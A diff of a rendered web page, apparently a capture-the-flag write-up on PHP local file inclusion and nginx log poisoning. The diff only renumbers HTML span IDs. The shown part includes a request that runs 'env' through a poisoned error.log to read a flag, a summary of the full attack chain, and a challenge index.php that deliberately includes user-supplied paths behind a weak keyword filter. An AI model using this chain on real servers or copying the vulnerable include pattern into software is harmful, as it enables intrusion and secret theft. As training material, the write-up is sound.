 <p><strong>执行代码不会把代码本身打印出来 —— 所以那一段在响应里"凭空消失"。</strong></p>
 <p><strong>这也说明：用 <code>include</code> 看日志是「执行后的残骸」，只有 <code>php://filter</code> 才能做取证。</strong></p>
 <h4 id="step-10flag-flag"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#step-10flag-flag">Step 10：flag 不在 flag 文件里</a></h4>
 <p><strong><code>ls -la /</code> 看到了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>-r--------    1 root root   48 Oct 30 06:11 flag
-</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>-rwxr-xr-x    1 root root 1507 Oct 16 18:22 entrypoint.sh
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>-r--------    1 root root   48 Oct 30 06:11 flag
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>-rwxr-xr-x    1 root root 1507 Oct 16 18:22 entrypoint.sh
 </span></code></pre></div>
 <p><strong><code>/flag</code> 是 <code>400 root</code>，而当前进程是 <code>uid=33(www-data)</code> —— <code>cat /flag</code> 读不了，权限不够。</strong></p>
 <p><strong>那就读 <code>entrypoint.sh</code>（755，可读）：</strong></p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="nv">FLAG_VALUE</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">ZeroG_2026_FLAG</span><span class="k">:-</span><span class="si">}</span><span class="s2">"</span>
-</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ZeroG_2026_FLAG</span><span class="o">=</span><span class="s2">"</span><span class="nv">$FLAG_VALUE</span><span class="s2">"</span>
-</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">'%s\n'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$FLAG_VALUE</span><span class="s2">"</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$FLAG_FILE</span><span class="s2">"</span>
-</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>chown<span class="w"> </span>root:root<span class="w"> </span><span class="s2">"</span><span class="nv">$FLAG_FILE</span><span class="s2">"</span>
-</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a>chmod<span class="w"> </span><span class="m">400</span><span class="w"> </span><span class="s2">"</span><span class="nv">$FLAG_FILE</span><span class="s2">"</span>
-</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a><span class="nb">exec</span><span class="w"> </span>apache2-foreground
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="nv">FLAG_VALUE</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">ZeroG_2026_FLAG</span><span class="k">:-</span><span class="si">}</span><span class="s2">"</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ZeroG_2026_FLAG</span><span class="o">=</span><span class="s2">"</span><span class="nv">$FLAG_VALUE</span><span class="s2">"</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">'%s\n'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$FLAG_VALUE</span><span class="s2">"</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$FLAG_FILE</span><span class="s2">"</span>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>chown<span class="w"> </span>root:root<span class="w"> </span><span class="s2">"</span><span class="nv">$FLAG_FILE</span><span class="s2">"</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>chmod<span class="w"> </span><span class="m">400</span><span class="w"> </span><span class="s2">"</span><span class="nv">$FLAG_FILE</span><span class="s2">"</span>
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="nb">exec</span><span class="w"> </span>apache2-foreground
 </span></code></pre></div>
 <p><strong>原来如此：flag 来自环境变量 <code>ZeroG_2026_FLAG</code>，写进 <code>/flag</code> 之后</strong>还 export 给了 Apache<strong>。</strong></p>
 <p><strong>Apache 的子进程继承这个环境变量 → PHP 进程的 <code>/proc/self/environ</code> 里就有。</strong></p>
 <p><img alt="环境变量里的 flag" src="../../../assets/images/pengxing-doc/06-env-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>?file=/var/log/nginx/error.log&amp;2=env
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>?file=/var/log/nginx/error.log&amp;2=env
 </span></code></pre></div>
 <p><strong>在输出里直接就能看到：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>ZeroG_2026_FLAG=ZeroGFlag{18e84305-6b07-4aca-84ee-9891c5cb062d}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>ZeroG_2026_FLAG=ZeroGFlag{18e84305-6b07-4aca-84ee-9891c5cb062d}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>页面到处点 → 只有「文档预览」是真功能
-</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>  → 前端 fetch('index.php?file='+name)   ← 泄漏了接口名
-</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>    → 直接读 index.php 是空的（被 include 执行了）
-</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a>      → php://filter/convert.base64-encode 读源码
-</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a>        → 发现 cmd 是陷阱（函数从未被调用）
-</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>          → 真入口是 include，绝对路径放行
-</span><span id="__span-82-7"><a id="__codelineno-82-7" name="__codelineno-82-7" href="#__codelineno-82-7"></a>            → 日志可读可写 → 注入 PHP 到 error.log
-</span><span id="__span-82-8"><a id="__codelineno-82-8" name="__codelineno-82-8" href="#__codelineno-82-8"></a>              → include 日志 → RCE
-</span><span id="__span-82-9"><a id="__codelineno-82-9" name="__codelineno-82-9" href="#__codelineno-82-9"></a>                → /flag 是 400 root 读不了
-</span><span id="__span-82-10"><a id="__codelineno-82-10" name="__codelineno-82-10" href="#__codelineno-82-10"></a>                  → entrypoint.sh 暴露了 flag 来自环境变量
-</span><span id="__span-82-11"><a id="__codelineno-82-11" name="__codelineno-82-11" href="#__codelineno-82-11"></a>                    → /proc/self/environ → flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>页面到处点 → 只有「文档预览」是真功能
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>  → 前端 fetch('index.php?file='+name)   ← 泄漏了接口名
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>    → 直接读 index.php 是空的（被 include 执行了）
+</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>      → php://filter/convert.base64-encode 读源码
+</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>        → 发现 cmd 是陷阱（函数从未被调用）
+</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a>          → 真入口是 include，绝对路径放行
+</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a>            → 日志可读可写 → 注入 PHP 到 error.log
+</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a>              → include 日志 → RCE
+</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a>                → /flag 是 400 root 读不了
+</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a>                  → entrypoint.sh 暴露了 flag 来自环境变量
+</span><span id="__span-61-11"><a id="__codelineno-61-11" name="__codelineno-61-11" href="#__codelineno-61-11"></a>                    → /proc/self/environ → flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../pengxing-doc-lfi-log-poisoning/#_4">漏洞原理</a></h4>
 <p><strong>① WAF 保护的不一定是真入口</strong></p>
@@ -5259,62 +5558,62 @@
 <hr />
 <details class="note">
 <summary>index.php 完整源码</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>
-</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a><span class="c1">// 统一返回纯文本，便于前端在预览区域直接展示</span>
-</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5" href="#__codelineno-83-5"></a><span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=utf-8'</span><span class="p">);</span>
-</span><span id="__span-83-6"><a id="__codelineno-83-6" name="__codelineno-83-6" href="#__codelineno-83-6"></a>
-</span><span id="__span-83-7"><a id="__codelineno-83-7" name="__codelineno-83-7" href="#__codelineno-83-7"></a><span class="c1">// 安全策略：请求内容匹配规则</span>
-</span><span id="__span-83-8"><a id="__codelineno-83-8" name="__codelineno-83-8" href="#__codelineno-83-8"></a><span class="nv">$WAF_PATTERN</span> <span class="o">=</span> <span class="s1">'/(flag|cat|ls|\*|\?)/i'</span><span class="p">;</span>
-</span><span id="__span-83-9"><a id="__codelineno-83-9" name="__codelineno-83-9" href="#__codelineno-83-9"></a>
-</span><span id="__span-83-10"><a id="__codelineno-83-10" name="__codelineno-83-10" href="#__codelineno-83-10"></a><span class="sd">/**</span>
-</span><span id="__span-83-11"><a id="__codelineno-83-11" name="__codelineno-83-11" href="#__codelineno-83-11"></a><span class="sd"> * 内部运维命令执行工具。</span>
-</span><span id="__span-83-12"><a id="__codelineno-83-12" name="__codelineno-83-12" href="#__codelineno-83-12"></a><span class="sd"> * 仅供服务器内部维护脚本调用，Web 接口层不再直接触发。</span>
-</span><span id="__span-83-13"><a id="__codelineno-83-13" name="__codelineno-83-13" href="#__codelineno-83-13"></a><span class="sd"> */</span>
-</span><span id="__span-83-14"><a id="__codelineno-83-14" name="__codelineno-83-14" href="#__codelineno-83-14"></a><span class="k">function</span> <span class="nf">run_maintenance_command</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
-</span><span id="__span-83-15"><a id="__codelineno-83-15" name="__codelineno-83-15" href="#__codelineno-83-15"></a><span class="p">{</span>
-</span><span id="__span-83-16"><a id="__codelineno-83-16" name="__codelineno-83-16" href="#__codelineno-83-16"></a>    <span class="k">return</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
-</span><span id="__span-83-17"><a id="__codelineno-83-17" name="__codelineno-83-17" href="#__codelineno-83-17"></a><span class="p">}</span>
-</span><span id="__span-83-18"><a id="__codelineno-83-18" name="__codelineno-83-18" href="#__codelineno-83-18"></a>
-</span><span id="__span-83-19"><a id="__codelineno-83-19" name="__codelineno-83-19" href="#__codelineno-83-19"></a><span class="cm">/* 第四层：命令参数安全校验</span>
-</span><span id="__span-83-20"><a id="__codelineno-83-20" name="__codelineno-83-20" href="#__codelineno-83-20"></a><span class="cm"> * 仅当请求中包含 cmd 参数时，才进行安全策略检查。 */</span>
-</span><span id="__span-83-21"><a id="__codelineno-83-21" name="__codelineno-83-21" href="#__codelineno-83-21"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-83-22"><a id="__codelineno-83-22" name="__codelineno-83-22" href="#__codelineno-83-22"></a>    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
-</span><span id="__span-83-23"><a id="__codelineno-83-23" name="__codelineno-83-23" href="#__codelineno-83-23"></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$WAF_PATTERN</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-83-24"><a id="__codelineno-83-24" name="__codelineno-83-24" href="#__codelineno-83-24"></a>        <span class="k">echo</span> <span class="s2">"安全策略：检测到不允许的请求内容，该操作已被拦截并记录。</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
-</span><span id="__span-83-25"><a id="__codelineno-83-25" name="__codelineno-83-25" href="#__codelineno-83-25"></a>        <span class="k">exit</span><span class="p">;</span>
-</span><span id="__span-83-26"><a id="__codelineno-83-26" name="__codelineno-83-26" href="#__codelineno-83-26"></a>    <span class="p">}</span>
-</span><span id="__span-83-27"><a id="__codelineno-83-27" name="__codelineno-83-27" href="#__codelineno-83-27"></a>    <span class="c1">// 校验通过，命令参数将在文档内容渲染阶段被一并处理</span>
-</span><span id="__span-83-28"><a id="__codelineno-83-28" name="__codelineno-83-28" href="#__codelineno-83-28"></a><span class="p">}</span>
-</span><span id="__span-83-29"><a id="__codelineno-83-29" name="__codelineno-83-29" href="#__codelineno-83-29"></a>
-</span><span id="__span-83-30"><a id="__codelineno-83-30" name="__codelineno-83-30" href="#__codelineno-83-30"></a><span class="cm">/* 第一 / 第二层：文档路径解析与内容包含 */</span>
-</span><span id="__span-83-31"><a id="__codelineno-83-31" name="__codelineno-83-31" href="#__codelineno-83-31"></a><span class="nv">$file</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'welcome.txt'</span><span class="p">;</span>
-</span><span id="__span-83-32"><a id="__codelineno-83-32" name="__codelineno-83-32" href="#__codelineno-83-32"></a>
-</span><span id="__span-83-33"><a id="__codelineno-83-33" name="__codelineno-83-33" href="#__codelineno-83-33"></a><span class="c1">// 规范化文档路径，移除相对路径记号</span>
-</span><span id="__span-83-34"><a id="__codelineno-83-34" name="__codelineno-83-34" href="#__codelineno-83-34"></a><span class="nv">$file</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'../'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
-</span><span id="__span-83-35"><a id="__codelineno-83-35" name="__codelineno-83-35" href="#__codelineno-83-35"></a><span class="nv">$file</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'..'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
-</span><span id="__span-83-36"><a id="__codelineno-83-36" name="__codelineno-83-36" href="#__codelineno-83-36"></a>
-</span><span id="__span-83-37"><a id="__codelineno-83-37" name="__codelineno-83-37" href="#__codelineno-83-37"></a><span class="nv">$target</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
-</span><span id="__span-83-38"><a id="__codelineno-83-38" name="__codelineno-83-38" href="#__codelineno-83-38"></a>
-</span><span id="__span-83-39"><a id="__codelineno-83-39" name="__codelineno-83-39" href="#__codelineno-83-39"></a><span class="c1">// 识别 php:// 等流封装协议</span>
-</span><span id="__span-83-40"><a id="__codelineno-83-40" name="__codelineno-83-40" href="#__codelineno-83-40"></a><span class="nv">$is_stream</span> <span class="o">=</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'#^[a-zA-Z0-9._+-]+://#'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">;</span>
-</span><span id="__span-83-41"><a id="__codelineno-83-41" name="__codelineno-83-41" href="#__codelineno-83-41"></a>
-</span><span id="__span-83-42"><a id="__codelineno-83-42" name="__codelineno-83-42" href="#__codelineno-83-42"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$is_stream</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-83-43"><a id="__codelineno-83-43" name="__codelineno-83-43" href="#__codelineno-83-43"></a>    <span class="nv">$target</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
-</span><span id="__span-83-44"><a id="__codelineno-83-44" name="__codelineno-83-44" href="#__codelineno-83-44"></a><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-83-45"><a id="__codelineno-83-45" name="__codelineno-83-45" href="#__codelineno-83-45"></a>    <span class="nv">$target</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
-</span><span id="__span-83-46"><a id="__codelineno-83-46" name="__codelineno-83-46" href="#__codelineno-83-46"></a><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s1">'files/'</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-83-47"><a id="__codelineno-83-47" name="__codelineno-83-47" href="#__codelineno-83-47"></a>    <span class="nv">$target</span> <span class="o">=</span> <span class="s1">'files/'</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
-</span><span id="__span-83-48"><a id="__codelineno-83-48" name="__codelineno-83-48" href="#__codelineno-83-48"></a><span class="p">}</span>
-</span><span id="__span-83-49"><a id="__codelineno-83-49" name="__codelineno-83-49" href="#__codelineno-83-49"></a>
-</span><span id="__span-83-50"><a id="__codelineno-83-50" name="__codelineno-83-50" href="#__codelineno-83-50"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$target</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-83-51"><a id="__codelineno-83-51" name="__codelineno-83-51" href="#__codelineno-83-51"></a>    <span class="k">echo</span> <span class="s2">"未找到指定的文档，请确认文件名称是否正确。</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
-</span><span id="__span-83-52"><a id="__codelineno-83-52" name="__codelineno-83-52" href="#__codelineno-83-52"></a>    <span class="k">exit</span><span class="p">;</span>
-</span><span id="__span-83-53"><a id="__codelineno-83-53" name="__codelineno-83-53" href="#__codelineno-83-53"></a><span class="p">}</span>
-</span><span id="__span-83-54"><a id="__codelineno-83-54" name="__codelineno-83-54" href="#__codelineno-83-54"></a>
-</span><span id="__span-83-55"><a id="__codelineno-83-55" name="__codelineno-83-55" href="#__codelineno-83-55"></a><span class="c1">// 输出文档内容</span>
-</span><span id="__span-83-56"><a id="__codelineno-83-56" name="__codelineno-83-56" href="#__codelineno-83-56"></a><span class="k">include</span><span class="p">(</span><span class="nv">$target</span><span class="p">);</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a><span class="c1">// 统一返回纯文本，便于前端在预览区域直接展示</span>
+</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a><span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=utf-8'</span><span class="p">);</span>
+</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>
+</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a><span class="c1">// 安全策略：请求内容匹配规则</span>
+</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a><span class="nv">$WAF_PATTERN</span> <span class="o">=</span> <span class="s1">'/(flag|cat|ls|\*|\?)/i'</span><span class="p">;</span>
+</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a>
+</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a><span class="sd">/**</span>
+</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a><span class="sd"> * 内部运维命令执行工具。</span>
+</span><span id="__span-62-12"><a id="__codelineno-62-12" name="__codelineno-62-12" href="#__codelineno-62-12"></a><span class="sd"> * 仅供服务器内部维护脚本调用，Web 接口层不再直接触发。</span>
+</span><span id="__span-62-13"><a id="__codelineno-62-13" name="__codelineno-62-13" href="#__codelineno-62-13"></a><span class="sd"> */</span>
+</span><span id="__span-62-14"><a id="__codelineno-62-14" name="__codelineno-62-14" href="#__codelineno-62-14"></a><span class="k">function</span> <span class="nf">run_maintenance_command</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
+</span><span id="__span-62-15"><a id="__codelineno-62-15" name="__codelineno-62-15" href="#__codelineno-62-15"></a><span class="p">{</span>
+</span><span id="__span-62-16"><a id="__codelineno-62-16" name="__codelineno-62-16" href="#__codelineno-62-16"></a>    <span class="k">return</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
+</span><span id="__span-62-17"><a id="__codelineno-62-17" name="__codelineno-62-17" href="#__codelineno-62-17"></a><span class="p">}</span>
+</span><span id="__span-62-18"><a id="__codelineno-62-18" name="__codelineno-62-18" href="#__codelineno-62-18"></a>
+</span><span id="__span-62-19"><a id="__codelineno-62-19" name="__codelineno-62-19" href="#__codelineno-62-19"></a><span class="cm">/* 第四层：命令参数安全校验</span>
+</span><span id="__span-62-20"><a id="__codelineno-62-20" name="__codelineno-62-20" href="#__codelineno-62-20"></a><span class="cm"> * 仅当请求中包含 cmd 参数时，才进行安全策略检查。 */</span>
+</span><span id="__span-62-21"><a id="__codelineno-62-21" name="__codelineno-62-21" href="#__codelineno-62-21"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> <span class="p">{</span>
+</span><span id="__span-62-22"><a id="__codelineno-62-22" name="__codelineno-62-22" href="#__codelineno-62-22"></a>    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
+</span><span id="__span-62-23"><a id="__codelineno-62-23" name="__codelineno-62-23" href="#__codelineno-62-23"></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$WAF_PATTERN</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-62-24"><a id="__codelineno-62-24" name="__codelineno-62-24" href="#__codelineno-62-24"></a>        <span class="k">echo</span> <span class="s2">"安全策略：检测到不允许的请求内容，该操作已被拦截并记录。</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+</span><span id="__span-62-25"><a id="__codelineno-62-25" name="__codelineno-62-25" href="#__codelineno-62-25"></a>        <span class="k">exit</span><span class="p">;</span>
+</span><span id="__span-62-26"><a id="__codelineno-62-26" name="__codelineno-62-26" href="#__codelineno-62-26"></a>    <span class="p">}</span>
+</span><span id="__span-62-27"><a id="__codelineno-62-27" name="__codelineno-62-27" href="#__codelineno-62-27"></a>    <span class="c1">// 校验通过，命令参数将在文档内容渲染阶段被一并处理</span>
+</span><span id="__span-62-28"><a id="__codelineno-62-28" name="__codelineno-62-28" href="#__codelineno-62-28"></a><span class="p">}</span>
+</span><span id="__span-62-29"><a id="__codelineno-62-29" name="__codelineno-62-29" href="#__codelineno-62-29"></a>
+</span><span id="__span-62-30"><a id="__codelineno-62-30" name="__codelineno-62-30" href="#__codelineno-62-30"></a><span class="cm">/* 第一 / 第二层：文档路径解析与内容包含 */</span>
+</span><span id="__span-62-31"><a id="__codelineno-62-31" name="__codelineno-62-31" href="#__codelineno-62-31"></a><span class="nv">$file</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'welcome.txt'</span><span class="p">;</span>
+</span><span id="__span-62-32"><a id="__codelineno-62-32" name="__codelineno-62-32" href="#__codelineno-62-32"></a>
+</span><span id="__span-62-33"><a id="__codelineno-62-33" name="__codelineno-62-33" href="#__codelineno-62-33"></a><span class="c1">// 规范化文档路径，移除相对路径记号</span>
+</span><span id="__span-62-34"><a id="__codelineno-62-34" name="__codelineno-62-34" href="#__codelineno-62-34"></a><span class="nv">$file</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'../'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span><span id="__span-62-35"><a id="__codelineno-62-35" name="__codelineno-62-35" href="#__codelineno-62-35"></a><span class="nv">$file</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'..'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span><span id="__span-62-36"><a id="__codelineno-62-36" name="__codelineno-62-36" href="#__codelineno-62-36"></a>
+</span><span id="__span-62-37"><a id="__codelineno-62-37" name="__codelineno-62-37" href="#__codelineno-62-37"></a><span class="nv">$target</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span><span id="__span-62-38"><a id="__codelineno-62-38" name="__codelineno-62-38" href="#__codelineno-62-38"></a>
+</span><span id="__span-62-39"><a id="__codelineno-62-39" name="__codelineno-62-39" href="#__codelineno-62-39"></a><span class="c1">// 识别 php:// 等流封装协议</span>
+</span><span id="__span-62-40"><a id="__codelineno-62-40" name="__codelineno-62-40" href="#__codelineno-62-40"></a><span class="nv">$is_stream</span> <span class="o">=</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'#^[a-zA-Z0-9._+-]+://#'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-62-41"><a id="__codelineno-62-41" name="__codelineno-62-41" href="#__codelineno-62-41"></a>
+</span><span id="__span-62-42"><a id="__codelineno-62-42" name="__codelineno-62-42" href="#__codelineno-62-42"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$is_stream</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-62-43"><a id="__codelineno-62-43" name="__codelineno-62-43" href="#__codelineno-62-43"></a>    <span class="nv">$target</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+</span><span id="__span-62-44"><a id="__codelineno-62-44" name="__codelineno-62-44" href="#__codelineno-62-44"></a><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-62-45"><a id="__codelineno-62-45" name="__codelineno-62-45" href="#__codelineno-62-45"></a>    <span class="nv">$target</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
